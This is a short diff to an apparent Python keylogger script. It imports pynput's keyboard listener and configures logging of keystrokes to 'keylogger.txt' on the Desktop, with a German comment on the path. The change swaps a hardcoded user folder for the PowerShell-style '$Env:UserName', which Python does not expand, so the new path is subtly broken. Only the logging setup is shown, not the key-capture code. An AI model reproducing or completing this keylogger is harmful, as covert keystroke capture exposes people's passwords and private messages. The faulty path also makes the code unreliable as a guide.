@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_destination = "C:\\Users\OkansPC\Desktop\\"                     #nach dem ordnerpfad zwei backslashes - dateiname und pfad wird zusammengeklebt
+log_destination = "C:\\Users\$Env:UserName\Desktop\\"                     #nach dem ordnerpfad zwei backslashes - dateiname und pfad wird zusammengeklebt
 log_name = "keylogger.txt"
 
 logging.basicConfig(filename=(log_destination + log_name), level=logging.DEBUG, format='%(asctime)s >> %(message)s')
